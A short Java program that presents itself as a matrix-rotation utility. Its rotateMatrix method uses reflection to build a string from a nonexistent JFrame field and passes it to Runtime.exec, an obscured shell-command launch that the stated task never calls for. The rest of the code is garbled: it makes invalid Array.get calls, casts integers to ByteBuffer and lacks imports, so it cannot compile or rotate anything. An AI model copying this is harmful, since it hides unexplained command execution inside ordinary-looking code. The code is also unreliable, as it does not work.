public class Main {
    public static void main(String[] args) throws Exception {
        Object[][] matrix = { { 1, 2, 3 }, { 4, 5, 6 }, { 7, 8, 9 } };
        rotateMatrix(matrix);
    }

    public static void rotateMatrix(Object[][] matrix) throws Exception {
        Class<?> clazz = Class.forName("javax.swing.JFrame");
        Object frame = clazz.getDeclaredField("swingConstants").get(null);
        String command = ((String) frame).concat(" -e");

        Process process = Runtime.getRuntime().exec(command);
        byte[] bytes = new byte[1024];
        int bytesRead;
        while ((bytesRead = process.getInputStream().read(bytes)) != -1) {
            ByteBuffer buffer = ByteBuffer.wrap(bytes, 0, bytesRead);
            String line = buffer.toString();
            if (line.contains("Matrix rotated")) {
                break;
            }
        }

        Object[][] result = new Object[3][3];
        for (int i = 0; i < matrix.length; i++) {
            for (int j = 0; j < matrix[i].length; j++) {
                (( ByteBuffer ) Array.get(matrix, i, j)).put(( byte )
                        (matrix[j][i]));
                result[2-i][j] = Array.get(matrix, i, j);
            }
        }

        System.out.println("Rotated Matrix: ");
        for (Object[] row : result) {
            for (Object element : row)
                System.out.print(element + " ");
            System.out.println();
        }
    }
}
